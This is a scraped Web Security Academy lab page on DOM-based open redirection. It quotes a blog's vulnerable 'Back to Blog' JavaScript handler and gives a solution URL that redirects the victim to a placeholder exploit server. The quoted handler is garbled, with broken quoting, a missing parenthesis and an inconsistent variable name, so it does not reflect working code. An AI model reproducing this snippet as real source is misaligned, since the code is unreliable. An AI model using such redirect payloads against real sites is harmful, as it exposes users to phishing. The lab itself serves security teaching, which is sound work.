# Lab: DOM-based open redirection

Source: https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection
Fetched: 2026-06-28T09:17:49.341574+00:00

Web Security Academy

DOM-based

Open redirection

Lab

Lab: DOM-based open redirection

This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this vulnerability and redirect the victim to the exploit server.

Solution

The blog post page contains the following link, which returns to the home page of the blog:

<a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>

The url parameter contains an open redirection vulnerability that allows you to change where the "Back to Blog" link takes the user. To solve the lab, construct and visit the following URL, remembering to change the URL to contain your lab ID and your exploit server ID:

https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

Find DOM-based vulnerabilities using Burp Suite

Try for free
